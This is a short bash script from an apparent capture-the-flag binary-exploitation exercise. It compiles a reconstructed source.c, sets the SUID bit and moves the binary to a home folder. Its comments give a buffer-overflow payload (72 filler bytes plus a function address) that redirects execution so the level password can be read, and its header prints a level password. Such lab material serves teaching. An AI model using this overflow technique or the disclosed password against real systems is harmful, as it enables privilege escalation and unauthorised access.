#!/bin/bash
# This script will allow to test the pseudo code in source.c file by copy it in the folder /tmp in the VM

# -------------------------------- PREREQUIRES -------------------------------- #
#                            From your local machine                            #
#       Copy the source and the script files in the tmp folder in your VM       #
#                  scp -P 4242 path/source.c level7@VM_IP:/tmp                  #
#                  scp -P 4242 path/script.sh level7@VM_IP:/tmp                 #
#                                                                               #
#     pwd: f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d     #
#                                                                               #
#                                                                               #
#                                                                               #
#                   Don't forget to run it ;) bash script.sh                    #
# ----------------------------------------------------------------------------- #

# Compile the program
gcc source.c -o ft_level6

# Set SUID to give root user permissions
chmod u+s ft_level6

# Add write and execution permissions on home directory
chmod +wx ~

# Move the program to home directory
mv ft_level6 ~


# Then you have to run the program and cat .pass as level6 by taping manually these commands

#	su level6
#	// check the new address of function n(), in this exemple it is 0x08048474.
#	/home/user/level7/ft_level6 $(python -c 'print "A" * 72 + "\x74\x84\x04\x08"')
